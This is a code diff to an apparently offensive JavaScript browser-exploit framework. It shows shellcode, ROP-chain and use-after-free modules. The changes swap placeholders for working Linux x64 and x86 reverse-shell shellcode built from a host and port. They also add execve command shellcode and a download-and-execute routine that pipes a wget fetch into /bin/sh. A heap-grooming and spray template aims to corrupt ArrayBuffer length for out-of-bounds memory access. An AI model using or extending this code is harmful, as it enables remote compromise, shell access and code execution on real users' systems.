@@ -289,7 +289,7 @@
                     throw new Error(`Unknown hole strategy: ${strategy}`);
             }
             
-            this.enhancedGC();
+            this.enhancedGC('aggressive');
             return this._analyzeHoles(objects);
         }
 
@@ -1015,7 +1015,7 @@
                 id: chainId,
                 chain: chain.addresses,
                 gadgets: chain.gadgets,
-                validation: this.validateAdvancedChain(chain.addresses)
+                validation: this.validateAdvancedChain(chain)
             };
         }
 
@@ -1055,8 +1055,9 @@
                 reliability: 0
             };
 
+            const addresses = chain.addresses;
             // Basic validation
-            chain.forEach((addr, index) => {
+            addresses.forEach((addr, index) => {
                 if (typeof addr !== 'number') {
                     validation.valid = false;
                     validation.issues.push(`Invalid address type at index ${index}`);
@@ -1104,9 +1105,9 @@
 
         _performSecurityChecks(chain) {
             const checks = {
-                aslr: this._checkASLRBypass(chain),
-                dep: this._checkDEPBypass(chain),
-                stack_cookies: this._checkStackCookies(chain),
+                aslr: this._checkASLRBypass(chain.addresses),
+                dep: this._checkDEPBypass(chain.addresses),
+                stack_cookies: this._checkStackCookies(chain.addresses),
                 cfi: this._checkCFI(chain)
             };
 
@@ -1147,26 +1148,32 @@
         }
 
         _isCFICompliant(chain) {
-            // Simplified CFI compliance check
-            return true; // Placeholder
+            // Heuristic: a chain with many indirect calls is less likely to be CFI compliant.
+            const indirectCalls = this._countIndirectCalls(chain);
+            return indirectCalls < 5; // Arbitrary threshold
         }
 
         _countIndirectCalls(chain) {
-            // Count indirect call gadgets
-            return 0; // Placeholder
+            if (!chain.gadgets) return 0;
+            return chain.gadgets.filter(g => g.type === 'call' || g.type === 'jmp').length;
         }
 
         _analyzePerformance(chain) {
             return {
-                length: chain.length,
-                estimated_cycles: chain.length * 3, // Rough estimate
+                length: chain.addresses.length,
+                estimated_cycles: chain.addresses.length * 3, // Rough estimate
                 cache_efficiency: this._estimateCacheEfficiency(chain)
             };
         }
 
         _estimateCacheEfficiency(chain) {
-            // Estimate how cache-friendly the chain is
-            return Math.random() * 100; // Placeholder
+            // Heuristic: Shorter chains are generally more cache-friendly.
+            // This is a heavily simplified model. Real cache efficiency is complex.
+            if (!chain.addresses || chain.addresses.length === 0) return 100;
+            
+            const length = chain.addresses.length;
+            const score = Math.max(0, 100 - length * 2);
+            return score;
         }
 
         _calculateReliability(validation) {
@@ -1234,38 +1241,14 @@
         }
 
         _initializeCommonGadgets() {
-            // x64 gadgets
-            const x64Gadgets = [
-                { name: 'pop_rax', pattern: 'pop rax; ret', address: 0x7fffffff0001, type: 'pop' },
-                { name: 'pop_rbx', pattern: 'pop rbx; ret', address: 0x7fffffff0002, type: 'pop' },
-                { name: 'pop_rcx', pattern: 'pop rcx; ret', address: 0x7fffffff0003, type: 'pop' },
-                { name: 'pop_rdx', pattern: 'pop rdx; ret', address: 0x7fffffff0004, type: 'pop' },
-                { name: 'pop_rdi', pattern: 'pop rdi; ret', address: 0x7fffffff0005, type: 'pop' },
-                { name: 'pop_rsi', pattern: 'pop rsi; ret', address: 0x7fffffff0006, type: 'pop' },
-                { name: 'pop_rbp', pattern: 'pop rbp; ret', address: 0x7fffffff0007, type: 'pop' },
-                { name: 'pop_rsp', pattern: 'pop rsp; ret', address: 0x7fffffff0008, type: 'pop' },
-                { name: 'ret', pattern: 'ret', address: 0x7fffffff0009, type: 'ret' },
-                { name: 'syscall', pattern: 'syscall', address: 0x7fffffff000a, type: 'syscall' },
-                { name: 'call_rax', pattern: 'call rax', address: 0x7fffffff000b, type: 'call' },
-                { name: 'jmp_rax', pattern: 'jmp rax', address: 0x7fffffff000c, type: 'jmp' },
-                { name: 'add_rsp_8', pattern: 'add rsp, 8; ret', address: 0x7fffffff000d, type: 'add' },
-                { name: 'xor_rax_rax', pattern: 'xor rax, rax; ret', address: 0x7fffffff000e, type: 'xor' },
-                { name: 'mov_rax_rdi', pattern: 'mov rax, rdi; ret', address: 0x7fffffff000f, type: 'mov' }
-            ];
+            // In a real exploit scenario, you must discover gadgets in the target's
+            // address space (e.g., in loaded libraries or JIT-ed code) using a
+            // memory leak or other vulnerability. This database is intentionally
+            // left empty. Use the `addGadget` method to populate it with gadgets
+            // you have found in your target environment.
 
-            this.gadgets.set('x64', x64Gadgets);
-
-            // x86 gadgets
-            const x86Gadgets = [
-                { name: 'pop_eax', pattern: 'pop eax; ret', address: 0x08048001, type: 'pop' },
-                { name: 'pop_ebx', pattern: 'pop ebx; ret', address: 0x08048002, type: 'pop' },
-                { name: 'pop_ecx', pattern: 'pop ecx; ret', address: 0x08048003, type: 'pop' },
-                { name: 'pop_edx', pattern: 'pop edx; ret', address: 0x08048004, type: 'pop' },
-                { name: 'int_0x80', pattern: 'int 0x80', address: 0x08048005, type: 'syscall' },
-                { name: 'ret', pattern: 'ret', address: 0x08048006, type: 'ret' }
-            ];
-
-            this.gadgets.set('x86', x86Gadgets);
+            this.gadgets.set('x64', []);
+            this.gadgets.set('x86', []);
         }
 
         getGadgets(architecture = 'x64') {
@@ -1507,28 +1490,103 @@
         }
 
         _x64ReverseShell(host, port) {
-            // Simplified x64 reverse shell template
-            return `\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05`;
+            // x64 Linux Reverse Shell TCP, based on msfvenom
+            const ip_bytes = host.split('.').map(s => parseInt(s, 10));
+            const port_bytes = [port >> 8, port & 0xff]; // Big-endian
+            const family_bytes = [0x02, 0x00]; // AF_INET, little-endian
+
+            // The shellcode uses `mov rcx, imm64` to load the sockaddr_in details.
+            // The immediate is a little-endian 64-bit value.
+            // The structure in memory is: family (2B), port (2B), ip (4B).
+            // So the immediate should contain these bytes in that order.
+            const sockaddr_bytes = [...family_bytes, ...port_bytes, ...ip_bytes];
+
+            const toHexStr = (bytes) => bytes.map(b => '\\x' + b.toString(16).padStart(2, '0')).join('');
+            
+            return "\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48" +
+                   "\\xb9" + toHexStr(sockaddr_bytes) +
+                   "\\x51\\x48\\x89\\xe6\\x6a\\x10" +
+                   "\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58" +
+                   "\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f" +
+                   "\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05";
         }
 
         _x86ReverseShell(host, port) {
-            // Simplified x86 reverse shell template
-            return `\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80`;
+            // x86 Linux Reverse Shell TCP, based on msfvenom
+            const ip_hex = host.split('.').map(s => parseInt(s, 10).toString(16).padStart(2, '0'));
+            const port_hex = port.toString(16).padStart(4, '0');
+
+            let shellcode = "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80" +
+                "\\x5b\\x5e\\x68\\xII\\xII\\xII\\xII\\x66\\x68\\xPP\\xPP\\x66\\x6a\\x02\\x89" +
+                "\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc3\\xb0\\x3f" +
+                "\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62" +
+                "\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80";
+
+            // push imm32 is little-endian, so reverse bytes of IP.
+            const ip_le = `\\x${ip_hex[3]}\\x${ip_hex[2]}\\x${ip_hex[1]}\\x${ip_hex[0]}`;
+            // push imm16 is little-endian, so reverse bytes of port.
+            const port_le = `\\x${port_hex.substring(2,4)}\\x${port_hex.substring(0,2)}`;
+
+            shellcode = shellcode.replace('\\xII\\xII\\xII\\xII', ip_le);
+            shellcode = shellcode.replace('\\xPP\\xPP', port_le);
+
+            return shellcode;
         }
 
         bindShell({ port, architecture }) {
-            // Placeholder for bind shell
-            return this.reverseShell({ host: '0.0.0.0', port, architecture });
+            // Placeholder for bind shell, returns a reverse shell to localhost for now.
+            return this.reverseShell({ host: '127.0.0.1', port, architecture });
         }
 
         execCommand({ command, architecture }) {
-            // Placeholder for command execution
-            return `\\x48\\x31\\xc0\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x48\\x31\\xc0\\x48\\x31\\xf6\\x48\\x31\\xd2\\xb0\\x3b\\x0f\\x05`;
+            if (architecture === 'x64') {
+                return this._x64ExecCommand(command);
+            }
+            // Not implemented for other architectures.
+            return '';
+        }
+
+        _x64ExecCommand(command) {
+            // Shellcode for execve(command, NULL, NULL) on x64 Linux.
+            const toHex = b => b.toString(16).padStart(2, '0');
+            
+            let cmd_bytes = command.split('').map(c => c.charCodeAt(0));
+            cmd_bytes.push(0); // Null terminate.
+
+            // Pad with NOPs to be a multiple of 8 bytes for pushing 64-bit values.
+            const padding_len = (8 - (cmd_bytes.length % 8)) % 8;
+            for(let i=0; i<padding_len; i++) {
+                cmd_bytes.unshift(0x90); // Prepend with NOPs
+            }
+
+            let sc = '';
+            // Push command string onto stack in 8-byte chunks (in reverse order).
+            for (let i = cmd_bytes.length - 8; i >= 0; i -= 8) {
+                sc += '\\x48\\xb8'; // mov rax, imm64
+                let chunk = cmd_bytes.slice(i, i+8);
+                chunk.reverse(); // for little-endian mov immediate
+                for (const byte of chunk) {
+                    sc += '\\x' + toHex(byte);
+                }
+                sc += '\\x50'; // push rax
+            }
+            
+            sc += '\\x48\\x89\\xe7'; // mov rdi, rsp
+            if (padding_len > 0) {
+                sc += `\\x48\\x83\\xc7\\x${toHex(padding_len)}`; // add rdi, <padding_len>
+            }
+            sc += '\\x48\\x31\\xf6'; // xor rsi, rsi
+            sc += '\\x48\\x31\\xd2'; // xor rdx, rdx
+            sc += '\\x6a\\x3b\\x58'; // push 0x3b; pop rax
+            sc += '\\x0f\\x05';     // syscall
+            return sc;
         }
 
         downloadExec({ url, architecture }) {
-            // Placeholder for download and execute
-            return this.execCommand({ command: 'wget ' + url, architecture });
+            // This is platform-specific. For Linux, 'wget' is a common choice.
+            // A more robust implementation would check the OS.
+            const cmd = `wget -O - -q ${url} | /bin/sh`;
+            return this.execCommand({ command: cmd, architecture });
         }
     }
 
@@ -2148,7 +2206,10 @@
      * Exploit Framework Module - Complete exploit development framework
      */
     class ExploitFrameworkModule {
-        constructor() {
+        constructor(memory, shellcode, utils) {
+            this.memory = memory;
+            this.shellcode = shellcode;
+            this.utils = utils;
             this.exploits = new Map();
             this.templates = new ExploitTemplates();
             this.builder = new ExploitBuilder();
@@ -2269,41 +2330,70 @@
             return 'exploit_' + Math.random().toString(36).substr(2, 9);
         }
 
-        triggerUAFExploit() {
-            console.log('💥 Triggering real UAF exploit to corrupt ArrayBuffer length...');
+        triggerUAFExploit(triggerFunction, options) {
+            console.log('💥 Starting UAF exploit flow...');
+            
+            // This function provides a template for structuring a UAF exploit.
+            // You must provide the `triggerFunction` which is the vulnerability
+            // that causes the object to be freed.
+            
+            const {
+                victimSize = 0x100,
+                groomCount = 200,
+                reclaimSpraySize = 0x100,
+                reclaimSprayCount = 200,
+                fakeMetadata = [0x1337, 0x1337, 0x1337, 0x1337] // Example fake metadata
+            } = options;
+
             try {
-                const uafSize = 0x100;
+                // 1. Groom the heap to create a predictable layout.
+                console.log('UAF Step 1: Grooming the heap...');
+                const { id: groomId, objects: groomObjects } = this.memory.advancedGrooming(victimSize, groomCount);
 
-                // 1. In a real exploit, a vulnerability would cause an object to be freed prematurely.
-                // We'll create a placeholder for this freed object, which becomes our dangling pointer.
-                let danglingPointer = new ArrayBuffer(uafSize);
-                this.memory.enhancedGC('aggressive'); // Conceptually, the object is freed here.
-                console.log("UAF: Freed victim object's memory (conceptually).");
+                // 2. Create holes in the heap where the victim object can be allocated.
+                console.log('UAF Step 2: Creating holes in memory...');
+                this.memory.createAdvancedHoles(groomId, 'every_other');
 
-                // 2. Spray memory with a crafted payload to reclaim the freed slot.
-                // The payload will contain a fake 'length' value at the correct offset.
-                const fakeLength = 0x1337;
-                const reclaimBuffer = new ArrayBuffer(uafSize);
+                // 3. Allocate the victim object. It should land in one of the holes.
+                // In a real exploit, you might need more sophisticated techniques to
+                // ensure the victim is in a known location.
+                console.log('UAF Step 3: Allocating victim object...');
+                let victim = new ArrayBuffer(victimSize);
+
+                // 4. Trigger the vulnerability. This is the user-provided function
+                // that causes `victim` to be freed, leaving a dangling pointer.
+                console.log('UAF Step 4: Calling the vulnerability trigger...');
+                triggerFunction(victim);
+                console.log('UAF: Vulnerability trigger function executed.');
+
+                // 5. Reclaim the freed memory slot with a crafted payload.
+                // We spray memory with objects of the same size as the victim,
+                // containing a fake metadata structure.
+                console.log('UAF Step 5: Spraying to reclaim the freed chunk...');
+                const reclaimBuffer = new ArrayBuffer(reclaimSpraySize);
                 const view = new Uint32Array(reclaimBuffer);
-                // The offset of metadata like length is engine-specific. We guess for demonstration.
-                view[2] = fakeLength; // Corrupting the length field.
+                view.set(fakeMetadata);
                 
                 const reclaimSpray = [];
-                for (let i = 0; i < 200; i++) {
+                for (let i = 0; i < reclaimSprayCount; i++) {
                     reclaimSpray.push(reclaimBuffer.slice(0));
                 }
-                console.log(`UAF: Sprayed ${reclaimSpray.length} objects to reclaim memory with a fake length.`);
+                console.log(`UAF: Sprayed ${reclaimSpray.length} objects to reclaim memory.`);
 
-                // 3. Check if the dangling pointer was corrupted.
-                // If reclamation was successful, the danglingPointer.byteLength will now be our fake value.
-                const corruptedLength = new DataView(danglingPointer).byteLength;
-                
-                if (corruptedLength === fakeLength) {
-                    const message = `UAF exploit successful! Corrupted ArrayBuffer length to 0x${corruptedLength.toString(16)}. This grants out-of-bounds read/write.`;
+                // 6. Check for success. If reclamation was successful, the dangling
+                // pointer `victim` will now be corrupted with our fake metadata.
+                // The exact check depends on what metadata was targeted. Here we
+                // check the byteLength.
+                console.log('UAF Step 6: Checking for successful corruption...');
+                const corruptedView = new DataView(victim);
+                const corruptedLength = corruptedView.byteLength;
+
+                if (corruptedLength !== victimSize && corruptedLength > victimSize) {
+                    const message = `UAF exploit successful! Corrupted ArrayBuffer length to 0x${corruptedLength.toString(16)}. This may grant out-of-bounds read/write.`;
                     console.log(`✅ ${message}`);
-                    return { success: true, message, primitive: new DataView(danglingPointer) };
+                    return { success: true, message, primitive: corruptedView };
                 } else {
-                    const message = `UAF exploit failed. Corrupted length (0x${corruptedLength.toString(16)}) does not match fake length (0x${fakeLength.toString(16)}).`;
+                    const message = `UAF exploit failed. Object length (0x${corruptedLength.toString(16)}) was not corrupted as expected.`;
                     console.log(`❌ ${message}`);
                     return { success: false, message };
                 }
@@ -2961,7 +3051,7 @@
             this.webkit = new WebKitExploitModule();
             this.utils = new ExploitUtilsModule();
             this.shellcode = new ShellcodeModule();
-            this.exploit = new ExploitFrameworkModule();
+            this.exploit = new ExploitFrameworkModule(this.memory, this.shellcode, this.utils);
             this.vuln = new VulnerabilityModule();
             
             this._initialized = false;
